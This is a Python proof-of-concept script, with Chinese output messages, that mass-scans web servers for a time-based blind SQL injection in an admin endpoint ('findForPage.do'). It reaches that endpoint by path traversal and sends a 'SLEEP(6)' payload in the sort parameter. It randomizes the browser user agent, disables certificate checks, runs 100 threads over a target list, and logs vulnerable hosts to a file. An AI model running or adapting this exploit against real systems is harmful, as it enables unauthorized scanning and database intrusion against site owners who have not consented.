import requests,argparse,sys,random
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]
i=random.choice(USER_AGENTS)

headers = {
            "User-Agent": i,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Connection": "close"
        }

def poc(target):
    link="/lddsm/service/../admin/bfclConfig/findForPage.do"
    payload="""page=1&rows=10&sidx=(SELECT 2005 FROM (SELECT(SLEEP(6)))IEWh)"""
    res1=requests.get(url=target,verify=False)
    try:
        if res1.status_code==200:
            res2=requests.post(url=target+link,data=payload,verify=False)
            if res2.elapsed.total_seconds() - res1.elapsed.total_seconds() >=5 and res2.elapsed.total_seconds() >=5:
                print(f"[+]{target}存在延时sql注入")
                with open("result3.txt", "a") as f:
                    f.write(f"{target}\n")
            else:
                print(f'[-]{target}不存在延时sql注入')
        else:
            print('[*]无法连接')
    except:
        pass

def main():

    parse=argparse.ArgumentParser(description="sql注入的检测脚本")
    parse.add_argument('-u','--url',dest="url",type=str,help="连接")
    
    parse.add_argument('-f','--file',dest="file",type=str,help="路径")

    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join() 
    else:
        print(f"请输入：python{sys.argv[0]} -h") 
            
if __name__ == "__main__":
    main()






